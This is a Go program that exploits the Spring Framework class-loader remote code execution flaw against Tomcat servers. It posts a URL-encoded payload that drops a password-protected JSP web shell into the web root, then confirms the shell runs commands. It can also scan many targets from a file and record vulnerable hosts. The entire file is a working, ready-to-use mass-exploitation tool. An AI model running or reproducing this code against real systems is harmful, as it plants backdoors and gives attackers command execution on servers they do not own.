package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/go-resty/resty/v2"
	"github.com/panjf2000/ants/v2"
)

var finalresult []string

var exp = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

func verify(target interface{}) {
	t := target.(string)
	exp = strings.Replace(exp, "tomcatwar", "configs", -1)

	client1 := resty.New().SetTimeout(10 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
	client1.SetTimeout(15 * time.Second)
	_, err := client1.R().
		SetHeader("suffix", "%>//").
		SetHeader("c1", "Runtime").
		SetHeader("c2", "<%").
		SetHeader("DNT", "1").
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
		SetBody(exp).
		Post(t)

	if err != nil {
		fmt.Println("Request error: " + t + "----" + err.Error())

	} else {
		client2 := resty.New().SetTimeout(10 * time.Second).SetTLSClientConfig(&tls.Config{InsecureSkipVerify: true})
		client2.SetTimeout(15 * time.Second)
		resp2, err := client2.R().
			SetHeader("Content-Type", "application/x-www-form-urlencoded").
			SetHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0").
			Post(t + "/configs.jsp")
		if err != nil {
			fmt.Println("Request error: " + t + "----" + err.Error())
		} else {
			if resp2.StatusCode() == http.StatusOK {
				finalresult = append(finalresult, t)
				fmt.Println("漏洞存在，shell地址为:" + t + "/configs.jsp?pwd=j&cmd=whoami")
			}
		}
	}
}

func main() {
	var targetURL, filepath string
	var thread int
	targets := []string{}

	flag.StringVar(&targetURL, "u", "", "")
	flag.StringVar(&filepath, "l", "", "")
	flag.IntVar(&thread, "t", 10, "")
	flag.CommandLine.Usage = func() {
		fmt.Println("shell：./springRCE -u http://127.0.0.1:8080")
		fmt.Println("批量：./springRCE -l url.txt -t 20")
	}

	flag.Parse()

	if len(targetURL) == 0 {
		file, err := os.OpenFile(filepath, os.O_RDWR, 0666)
		if err != nil {
			fmt.Println("Open file error!", err)
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			target := scanner.Text()
			if target == "" {
				continue
			}
			if !strings.Contains(target, "http") {
				target = "http://" + target
			}
			targets = append(targets, target)
		}
		wg := sync.WaitGroup{}
		p, _ := ants.NewPoolWithFunc(thread, func(i interface{}) {
			verify(i)
			wg.Done()
		})
		defer p.Release()

		for _, t := range targets {
			wg.Add(1)
			_ = p.Invoke(t)
		}
		wg.Wait()
		fileName := "vuln.txt"
		file, err = os.Create(fileName)
		if err != nil {
			return
		}
		defer file.Close()
		for _, v := range finalresult {
			file.WriteString(v + "\n")
		}

	} else {
		verify(targetURL)
	}

}
